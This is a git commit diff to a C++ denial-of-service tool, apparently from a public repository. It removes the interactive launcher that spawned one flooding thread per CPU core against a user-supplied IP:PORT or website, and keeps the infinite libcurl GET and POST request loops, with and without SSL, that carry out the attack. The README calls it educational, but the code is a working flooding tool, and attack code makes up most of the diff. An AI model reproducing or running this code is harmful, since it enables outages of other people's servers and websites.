fa74b944180c4ed61a7f391dec322e8b6ad161ff
Abdelaziz al Habid <Abdel_habid@live.nl>
2022-07-16 23:05:54 +0200

    - Removed execution function - Made the Algorithm Cleaner

--- DoS.h
+++ DoS.h
@@ -1,24 +1,27 @@
 #ifndef DOS_H
 #define DOS_H
 
+/*
+
+  **Abdelaziz aka cppLawyer**
+
+ - This Release Only Contains The Algorithm of DoS attack.
+
+*/
+
 #include <iostream>
 #include <curl/curl.h>
 #include <thread>
-namespace DoS{
 
+namespace DoS {
 	namespace do_not_touch {
-
-
 		inline static size_t constexpr write_cb(char* d, size_t n, size_t l, void* p) noexcept
 		{
 			return n * l;
-		}//so solve performance penalty
-
+		}
 
 		namespace POST {
 			inline void const dosRegular(const std::string& info) noexcept {
-				static uint_fast64_t xTime = 0;
-				static uint_fast64_t target = 1000;
 				do {
 					CURL* curl;
 					curl_global_init(CURL_GLOBAL_ALL);
@@ -30,19 +33,10 @@ namespace DoS{
 					curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "foo=bar&foz=baz");
 					curl_easy_perform(curl);
 					curl_easy_cleanup(curl);
-					if (xTime == target) {
-						target += 1000;
-						printf("Requests: %d\n", xTime);
-					}
-					++xTime;
 				} while (true);
 			}//for IP-PORT Targeting and Website Targeting if protocol is HTTP 
-			 //this function will execute much faster
-
 
 			inline void const dosSSL(const std::string& info) noexcept {
-				static uint_fast64_t xTime = 0;
-				static uint_fast64_t target = 1000;
 				do {
 					CURL* curl;
 					curl_global_init(CURL_GLOBAL_ALL);
@@ -56,22 +50,13 @@ namespace DoS{
 					curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "foo=bar&foz=baz");
 					curl_easy_perform(curl);
 					curl_easy_cleanup(curl);
-					if (xTime == target) {
-						target += 1000;
-						printf("Requests: %d\n", xTime);
-					}
 				} while (true);
 			}//for IP-PORT Targeting and Website Targeting if protocol is HTTPS 
-			 //this function will execute fast but not as fast as without SSL
-
 		}
-
 
 		namespace  GET {
 
 			inline void const dosRegular(const std::string& info) noexcept {
-				static uint_fast64_t xTime = 0;
-				static uint_fast64_t target = 1000;
 				do {
 					CURL* curl;
 					curl_global_init(CURL_GLOBAL_DEFAULT);
@@ -81,19 +66,10 @@ namespace DoS{
 					curl_easy_perform(curl);
 					curl_easy_cleanup(curl);
 					curl_global_cleanup();
-					if (xTime == target) {
-						target += 1000;
-						printf("Requests: %d\n", xTime);
-					}
-					++xTime;
 				} while (true);
 			}//for IP-PORT Targeting and Website Targeting if protocol is HTTP 
-			 //this function will execute much faster
-
 
 			inline void const dosSSL(const std::string& info) noexcept {
-				static uint_fast64_t xTime = 0;
-				static uint_fast64_t target = 1000;
 				do {
 					CURL* curl;
 					curl_global_init(CURL_GLOBAL_DEFAULT);
@@ -104,85 +80,10 @@ namespace DoS{
 					curl_easy_perform(curl);
 					curl_easy_cleanup(curl);
 					curl_global_cleanup();
-					if (xTime == target) {
-						target += 1000;
-						printf("Requests: %d\n", xTime);
-					}
+
 				} while (true);
 			}//for IP-PORT Targeting and Website Targeting if protocol is HTTPS 
-			 //this function will execute fast but not as fast as without SSL
-		}
-
-
-	}
-inline void Execute() noexcept{
-	const int total = std::thread::hardware_concurrency(); // OWN RISK TO CHANGE IF YOU CHANGE THERE WILL BE TASK SHIFTING PERFORMANCE PENALTY  ;)
-	std::vector<std::thread> vec;
-	vec.reserve(total);
-	std::cout << "------------------< cppLawyer >-------------------\n\nTo quit the program press 'q' and ENTER \n\n";
-	std::cout << "Does The Target use HTTPS | y/n : ";
-	char https;
-	std::string info;
-	std::cin >> https;
-	if (https == 'y') {
-		std::cout << "\n\n Does Input Target IP:PORT or Website: ";
-		std::cin >> info;
-		std::cout << "POST-attack or GET-attack (type p for POST else enter g):  ";
-		char attack;
-		std::cin >> attack;
-
-		if (attack == 'p') {
-			for (uint_fast8_t val = 0; val < total; ++val) {
-				vec.push_back(std::move(std::thread(do_not_touch::POST::dosSSL, std::ref(info))));
-			}
-			while (std::cin.get() != 'q') { std::this_thread::yield(); };
-			for (uint_fast8_t val = 0; val < total; ++val) {
-				vec[val].detach();
-			}
-		}
-		else {
-			for (uint_fast8_t val = 0; val < total; ++val) {
-				vec.push_back(std::move(std::thread(do_not_touch::GET::dosSSL, std::ref(info))));
-			}
-			while (std::cin.get() != 'q') { std::this_thread::yield(); };
-			for (uint_fast8_t val = 0; val < total; ++val) {
-				vec[val].detach();
-			}
-		}
-
-	}
-	else {
-		std::cout << "\n\n Input Target IP:PORT or Website: ";
-		std::cin >> info;
-		std::cout << "POST-attack or GET-attack (type p for POST else enter g):  ";
-		char attack;
-		std::cin >> attack;
-
-		if (attack == 'p') {
-			for (uint_fast8_t val = 0; val < total; ++val) {
-				vec.push_back(std::move(std::thread(do_not_touch::POST::dosRegular, std::ref(info))));
-			}
-			while (std::cin.get() != 'q') { std::this_thread::yield(); };
-			for (uint_fast8_t val = 0; val < total; ++val) {
-				vec[val].detach();
-			}
-		}
-		else {
-			for (uint_fast8_t val = 0; val < total; ++val) {
-				vec.push_back(std::move(std::thread(do_not_touch::GET::dosRegular, std::ref(info))));
-			}
-			while (std::cin.get() != 'q') { std::this_thread::yield(); };
-			for (uint_fast8_t val = 0; val < total; ++val) {
-				vec[val].detach();
-			}
 		}
 	}
-
-	EXIT_SUCCESS;
 }
-
-}
-
-
-
 #endif // !DOS_H
--- README.md
+++ README.md
@@ -2,24 +2,4 @@
 
 - This DoS-Attacker program is for education purposes only
 - The program is written in C++ and uses openSSL and libCURL libraries
-- I squeezed out all the performance so..... 
-
-Example:
-
-
-```
-#include <iostream>
-#include "DoS.h"
-
-int main() {
-        
-DoS::Execute();
-
-return 0;
-
-}
-
-```
-
-Thats it....
-
+- Algorithm Only
